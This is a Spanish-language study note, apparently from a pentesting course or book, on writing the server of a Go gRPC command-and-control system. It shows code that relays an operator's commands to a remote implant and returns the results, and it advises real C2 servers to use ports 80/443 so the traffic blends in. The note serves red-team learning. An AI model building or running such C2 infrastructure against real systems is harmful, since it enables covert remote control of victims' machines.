---
tags:
  - Go
  - Go/C2
  - Pentesting/Post-Explotacion
Descripción: "El servidor es la pieza más compleja: implementa ambos servicios de la API (Implant y Admin) y hace de intermediario, enrutando comandos del operador al implante y las…"
Fecha de actualización: 2026-07-25
Nota previa: "[[00 - Diseñar la API C2 con gRPC y Protobuf]]"
Nota siguiente: "[[02 - Implante, admin y endurecer el RAT]]"
Area: "[[Command and Control.base|Command and Control]]"
---
---

El servidor es la pieza más compleja: implementa **ambos** servicios de [[00 - Diseñar la API C2 con gRPC y Protobuf|la API]] (`Implant` y `Admin`) y hace de **intermediario**, enrutando comandos del operador al implante y las respuestas de vuelta. Lo elegante es cómo conecta ambos lados — con dos `channels` compartidos.

## Dos servidores, dos channels compartidos

Se definen dos tipos que implementan cada servicio, y **comparten** los mismos channels `work` (comandos pendientes) y `output` (resultados):

```go
type implantServer struct{ work, output chan *grpcapi.Command }
type adminServer   struct{ work, output chan *grpcapi.Command }
```

<mark style="background: #ADCCFFA6;">Los channels son el pegamento</mark>: el admin pone un comando en `work` → el implante lo recoge → ejecuta → pone el resultado en `output` → el admin lo lee. Cada método gRPC es un extremo de ese flujo.

## Los métodos: `select` no-bloqueante y goroutines

`FetchCommand` (lo llama el implante para sondear) usa un `select` **no bloqueante** sobre `work`: si hay trabajo lo devuelve, si no, el `default` devuelve vacío sin colgarse:

```go
func (s *implantServer) FetchCommand(ctx context.Context, _ *grpcapi.Empty) (*grpcapi.Command, error) {
    select {
    case cmd, ok := <-s.work:
        if !ok {
            return nil, status.Error(codes.Unavailable, "canal cerrado")
        }
        return cmd, nil
    default:
        return new(grpcapi.Command), nil    // sin trabajo: no bloquea
    }
}

func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
    s.output <- result                       // el implante devuelve la salida
    return &grpcapi.Empty{}, nil
}

func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
    go func() { s.work <- cmd }()            // encolar sin bloquear el handler...
    return <-s.output, nil                   // ...y esperar la respuesta
}
```

<mark style="background: #FFB8EBA6;">El `default` de `FetchCommand` es lo que permite el *polling*</mark>: el implante pregunta cada pocos segundos y, si no hay trabajo, recibe una respuesta vacía en vez de quedarse bloqueado. En `RunCommand`, el `work <- cmd` va en una goroutine porque el channel es *unbuffered* y bloquearía el handler; así el handler puede pasar a esperar en `output`. El efecto es un flujo **síncrono** para el operador: manda comando, espera resultado (patrón de [[13 - Goroutines, channels y concurrencia]]).

## El `main`: dos listeners separados

Se arrancan **dos** servidores gRPC en puertos distintos — implante y admin separados para poder restringir quién habla con la API de admin:

```go
work, output := make(chan *grpcapi.Command), make(chan *grpcapi.Command)
implant, admin := NewImplantServer(work, output), NewAdminServer(work, output)  // MISMOS channels

implantLis, _ := net.Listen("tcp", "localhost:4444")
adminLis, _ := net.Listen("tcp", "localhost:9090")

grpcImplant, grpcAdmin := grpc.NewServer(), grpc.NewServer()
grpcapi.RegisterImplantServer(grpcImplant, implant)
grpcapi.RegisterAdminServer(grpcAdmin, admin)

go grpcImplant.Serve(implantLis)     // uno en goroutine...
grpcAdmin.Serve(adminLis)            // ...otro bloquea el main
```

Pasar **los mismos** `work`/`output` a ambos servidores es lo que les deja comunicarse. Uno se sirve en una goroutine (para no bloquear) y el otro bloquea el `main`.

> [!warning]+ Modernizaciones sobre el libro
> - **`status.Error` con `codes`, no `errors.New`**: un `error` crudo llega al cliente como `codes.Unknown`, que no le dice nada. Devuelve códigos gRPC específicos (`Unavailable`, `Internal`) para que el cliente decida si reintentar (skill gRPC).
> - **`GracefulStop` al cerrar**: el libro no gestiona el apagado. `srv.GracefulStop()` drena los RPCs en vuelo antes de morir (con un `time.After` de *fallback* a `Stop()` para no colgarse).
> - **Channels *buffered* para escalar**: los `unbuffered` bloquean con un solo implante/operador a la vez. Para múltiples implantes u operadores concurrentes, channels con buffer y un mecanismo que **empareje cada petición con su respuesta** (si dos operadores mandan trabajo a la vez, cada uno debe recibir *su* salida, no la del otro) — el propio libro lo deja como ejercicio.

> [!info]+ Puertos y egress
> El libro usa 4444/9090 arbitrarios para no chocar con servicios locales. Un C2 real escucha en **80/443**: son los puertos que casi cualquier red deja salir, y el tráfico se camufla mejor entre HTTP/HTTPS legítimo. La elección de puerto y el *blending* con tráfico normal son OPSEC de Red Team.

El servidor ya proxya. Faltan los dos extremos —el implante que ejecuta y el admin que ordena— y cómo endurecer todo el conjunto → [[02 - Implante, admin y endurecer el RAT]].
